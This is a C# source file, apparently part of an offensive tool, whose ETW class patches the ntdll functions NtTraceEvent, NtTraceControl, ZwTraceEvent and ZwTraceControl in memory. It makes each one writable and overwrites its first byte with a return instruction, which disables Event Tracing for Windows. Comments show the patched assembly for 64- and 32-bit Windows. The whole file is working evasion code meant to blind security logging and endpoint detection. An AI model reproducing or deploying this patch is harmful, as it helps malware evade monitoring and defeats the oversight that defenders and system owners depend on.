using System;
using System.Runtime.InteropServices;
using static Offline.Special.Commons;

/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Offline.Special
{
    internal static class ETW
    {
        /*[UnmanagedFunctionPointer(CallingConvention.Winapi)]
        unsafe delegate NtStatus NtProtectVirtualMemory
            (
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                ref uint NumberOfBytesToProtect,
                PageAccessType NewAccessProtection,
                ref PageAccessType OldAccessProtection
            );

        static NtProtectVirtualMemory ntProtectVirtualMemory;

        static void PrepareDelegate()
        {
            IntPtr ntVirtualProtect = Resolver.GetExportAddress("ntdll.dll", "NtProtectVirtualMemory");
            ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntVirtualProtect, typeof(NtProtectVirtualMemory));
        }*/

        private static bool Patch(ref IntPtr address)
        {
            /*
            In 64 bit :            
            49 89 ca            ; mov r10, rcx    
            b8 5e 00 00 00      ; mov eax, 0x5E      
            0f 05               ; syscall    
            c3                  ; ret            
            =>
            c3                  ; ret 
            89 ca               ; mov edx, ecx               
            b8 5e 00 00 00      ; mov eax, 0x5E        
            0f 05               ; syscall                
            c3                  ; ret
            
            In 32 bit (W10 & W11) :

            b8 5e 00 00 00      ; mov eax, 0x5E
            ba 40 8b 30 4b      ; mov edx, 0x4B308B40         
            ff d2               ; call edx           
            c2 10 00            ; ret 0x10      
            =>
            c3                  ; ret
            5e 00 00 00         ; pop esi & add byte ptr ds:[eax], al
            ba 40 8b 30 4b      ; add byte ptr ds:[edx+0x4B308B40], bh      
            ff d2               ; call edx             
            c2 10 00            ; ret 0x10
            */
            PageAccessType flOld = new PageAccessType();
            PageAccessType flOldLast = new PageAccessType();

            byte[] retOpcode = new byte[] { 0xC3 };

            uint sizeHookCode = (uint)retOpcode.Length;

            if (address != IntPtr.Zero)
            {
                NtStatus n = ntProtectVirtualMemorySafe((IntPtr)(-1), ref address, ref sizeHookCode, PageAccessType.PAGE_EXECUTE_READWRITE, ref flOld);

                if (n != NtStatus.Success)
                    return false;

                Marshal.Copy(retOpcode, 0, address, retOpcode.Length);

                n = ntProtectVirtualMemorySafe((IntPtr)(-1), ref address, ref sizeHookCode, flOld, ref flOldLast);

                if (n != NtStatus.Success)
                    return false;

                return true;
            }
            return false;
        }

        internal static bool BlockIt()
        {
            //PrepareDelegate();

            IntPtr ntTraceEvent = Resolver.GetExportAddress("ntdll.dll", "NtTraceEvent");
            IntPtr ntTraceControl = Resolver.GetExportAddress("ntdll.dll", "NtTraceControl");

            IntPtr zwTraceEvent = Resolver.GetExportAddress("ntdll.dll", "ZwTraceEvent");
            IntPtr zwTraceControl = Resolver.GetExportAddress("ntdll.dll", "ZwTraceControl");

            bool b = Patch(ref ntTraceEvent);

            if (b)
                b = Patch(ref ntTraceControl);

            if (b)
                b = Patch(ref zwTraceEvent);

            if (b)
                b = Patch(ref zwTraceControl);

            return b;
        }
    }
}
